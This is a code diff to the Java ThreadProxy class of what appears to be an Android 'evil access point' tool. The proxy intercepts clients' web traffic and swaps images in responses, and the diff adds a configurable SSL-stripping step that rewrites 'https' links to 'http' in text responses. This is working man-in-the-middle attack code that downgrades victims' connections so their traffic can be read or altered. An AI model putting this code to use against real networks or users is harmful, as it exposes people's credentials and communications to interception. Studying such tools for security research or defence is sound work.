@@ -1,5 +1,6 @@
 package com.nibiru.evil_ap.proxy;
 
+import android.content.SharedPreferences;
 import android.util.Log;
 
 import java.io.BufferedReader;
@@ -13,6 +14,7 @@ import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.io.OutputStreamWriter;
 import java.io.PrintWriter;
+import java.io.UnsupportedEncodingException;
 import java.net.Socket;
 
 import okhttp3.OkHttpClient;
@@ -25,18 +27,20 @@ import okhttp3.Response;
 
 public class ThreadProxy implements Runnable{
     /**************************************CLASS FIELDS********************************************/
-    final static String TAG = "ThreadProxy";
+    protected final String TAG = getClass().getSimpleName();
     private Socket sClient;
     private OkHttpParser rp;
     private OkHttpClient okhttp;
     private InputStream imgSwap;
+    private SharedPreferences mConfig;
     private boolean debug = true;
     /**************************************CLASS METHODS*******************************************/
-    ThreadProxy(Socket sClient, InputStream img) {
+    ThreadProxy(Socket sClient, InputStream img, SharedPreferences config) {
         this.sClient = sClient;
         rp = new OkHttpParser();
         okhttp = new OkHttpClient();
         imgSwap = img;
+        mConfig = config;
     }
     @Override
     public void run() {
@@ -45,7 +49,6 @@ public class ThreadProxy implements Runnable{
         InputStream inFromServer = null;
         OutputStream outToClient = null;
         Response res = null;
-
         try {
             inFromClient = new BufferedReader(new InputStreamReader(sClient.getInputStream()));
             outToClient = sClient.getOutputStream();
@@ -61,15 +64,22 @@ public class ThreadProxy implements Runnable{
             //make request and get response
             res = okhttp.newCall(req).execute();
 
-            //prepare response headers
+            //prepare response
             byte[] bytesBody = res.body().bytes();
+            //check what we are sending back
+            String contentType = res.header("Content-Type");
+
+            //EDIT RESPONSE HERE (SSL STRIP)
+            if(mConfig.getBoolean("sslStrip", false) && contentType != null &&
+                    contentType.contains("text"))
+                bytesBody = sslStrip(bytesBody);
+            //prepare proper length response headers
             String headers = getResponseHeaders(res, bytesBody.length, getEtag(sRequest));
             headers = headers.replaceAll("\\n", "\r\n");
 
             ByteArrayOutputStream streamResponse = new ByteArrayOutputStream();
-            //check what we are sending back, if image then swap
-            String contentType = res.header("Content-Type");
-            if (imgSwap != null && contentType != null && contentType.contains("image/")){
+            //if we are sending back image then swap bytes
+            if (imgSwap != null && contentType != null && contentType.contains("image")){
                 //update content length
                 headers = headers.replaceAll("Content-Length:.*", "Content-Length: " +
                         imgSwap.available());
@@ -106,6 +116,17 @@ public class ThreadProxy implements Runnable{
              catch (IOException e) {
                  e.printStackTrace();
              }
+        }
+    }
+
+    private byte[] sslStrip(byte[] bytesBody) {
+        try {
+            String response = new String(bytesBody, "UTF-8");
+            response = response.replaceAll("https", "http");
+            return response.getBytes();
+        } catch (UnsupportedEncodingException e) {
+            e.printStackTrace();
+            return null;
         }
     }
 
